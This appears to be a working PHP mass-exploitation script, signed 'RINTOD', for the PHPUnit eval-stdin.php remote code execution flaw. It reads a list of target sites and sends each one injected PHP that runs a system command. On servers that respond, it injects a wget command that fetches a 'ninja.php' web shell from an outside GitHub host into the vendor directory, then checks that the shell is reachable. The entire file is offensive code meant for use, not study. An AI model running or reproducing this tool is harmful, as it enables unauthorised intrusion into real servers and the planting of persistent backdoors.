<?php
// RINTOD
// php uni.php list=list.txt
parse_str(implode("&", array_slice($argv, 1)), $_GET);
$list = @$_GET["list"];
$meong = explode("\n", file_get_contents($list));

foreach($meong as $url){
  $mek = retrive($url);
  if(preg_match("/Windows|window|windows|Window|Default|Template/", $mek)){
    echo "$url -> Vuln \n";
    echo "[+] Uploading Shell...\n";
    upshell($url);
    echo "[!] Shell Uploaded...\n";
    echo "[!] Checking Shell...\n";
    check($url);
  }
  else{
    echo "[-] $url System Disabled ... Maybe you must using another command function :D [Manual]\n";
  }
}
function check($url){
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $url."/vendor/phpunit/phpunit/src/Util/PHP/ninja.php");
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  $c = curl_exec($ch);
  $v = curl_getinfo($ch, CURLINFO_HTTP_CODE);
  if($v == 200){
    echo "[+] Shell Found ... $url/vendor/phpunit/phpunit/src/Util/PHP/ninja.php\n";
  }
  else{
    echo "[-] Shell Not Found ... Maybe dir not writable\n";
  }
}
function retrive($url){
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $url."/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php");
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($ch, CURLOPT_USERAGENT, "curl/7.47.0");
  curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
  //curl_setopt($ch, CURLOPT_VERBOSE, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
  curl_setopt($ch, CURLOPT_POSTFIELDS, '<?php echo system("ls -la");?>');
  $c = curl_exec($ch);
  curl_close($ch);
  return $c;
}
function upshell($url){
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $url."/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php");
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($ch, CURLOPT_USERAGENT, "curl/7.47.0");
  curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
  //curl_setopt($ch, CURLOPT_VERBOSE, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
  curl_setopt($ch, CURLOPT_POSTFIELDS, '<?php echo system("wget https://raw.githubusercontent.com/rintod/ninja/master/ninja.php");?>');
  $c = curl_exec($ch);
  curl_close($ch);
  return $c;
}
